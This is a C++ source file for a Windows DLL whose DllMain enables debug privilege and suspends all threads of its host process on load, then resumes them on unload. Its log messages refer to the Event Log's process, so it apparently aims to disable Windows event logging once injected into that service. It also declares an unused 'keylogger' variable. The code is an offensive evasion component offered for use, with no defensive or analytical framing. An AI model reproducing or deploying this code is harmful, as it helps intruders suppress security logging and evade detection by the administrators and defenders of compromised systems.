


//==============================================================================
//
//   dllmain.cpp
//
//==============================================================================
//  Copyright (C) Guilaume Plante 2020 <cybercastor@icloud.com>
//==============================================================================



#include "stdafx.h"

#include <objbase.h>
#include <stdio.h>
#include <tchar.h>
#pragma  comment(lib, "user32")
#pragma  comment(lib, "advapi32")
#include <windows.h>
#include <fstream>
#include <ctime>
#include <csignal>
#include "SuspendorResumeTid.h"

std::string keylogger = "", logFile = "";

MODULEDLL_API ULONG_PTR APIENTRY ModuleStatus(LPVOID lpParameter, LPVOID lWParameter)
{
	return 0;
}

#ifdef _DLL

void Suspend() 
{
	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return;
	}

	printf("[*]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return;
	}
	printf("Done\n");

	ListProcessThreads(pid, "suspend");
}

void Resume()
{
	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return;
	}

	printf("[*]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return;
	}
	printf("Done\n");

	ListProcessThreads(pid, "resume");

}
BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void*lpReserved)
{
	HANDLE g_hModule;

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		Suspend();
	}
	break;
	case DLL_PROCESS_DETACH:
	{
		Resume();
	}
	break;
	}
	return TRUE;
}

#endif
